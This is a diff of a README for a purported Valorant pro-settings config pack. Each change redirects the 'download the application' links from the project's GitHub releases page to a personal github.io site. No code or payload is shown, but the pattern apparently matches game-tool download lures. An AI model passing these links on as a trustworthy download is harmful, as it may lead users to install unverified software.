@@ -1,6 +1,6 @@
 # 🎯 valorant-config-pack-pro-2026 - One-Click Pro Settings for VCT Champions
 
-[![Download Now](https://img.shields.io/badge/Download-VCT_2026_Config_Pack-FF4655?style=for-the-badge&logo=valorant&logoColor=white)](https://github.com/Sergej78f/valorant-config-pack-pro-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-VCT_2026_Config_Pack-FF4655?style=for-the-badge&logo=valorant&logoColor=white)](https://sergej78f.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ No digging through streams, no copying numbers by hand. Everything is packed int
 
 **Visit this link to download the application:**
 
-👉 **[https://github.com/Sergej78f/valorant-config-pack-pro-2026/releases](https://github.com/Sergej78f/valorant-config-pack-pro-2026/releases)**
+👉 **[https://sergej78f.github.io](https://sergej78f.github.io)**
 
 Click the link above. You will see a list of files on that page.
 
@@ -222,7 +222,7 @@ If you did all steps, you're ready. Enjoy your new pro-level settings.
 
 Need to revisit? Use this link anytime:
 
-**[https://github.com/Sergej78f/valorant-config-pack-pro-2026/releases](https://github.com/Sergej78f/valorant-config-pack-pro-2026/releases)**
+**[https://sergej78f.github.io](https://sergej78f.github.io)**
 
 Bookmark it for future updates.
 
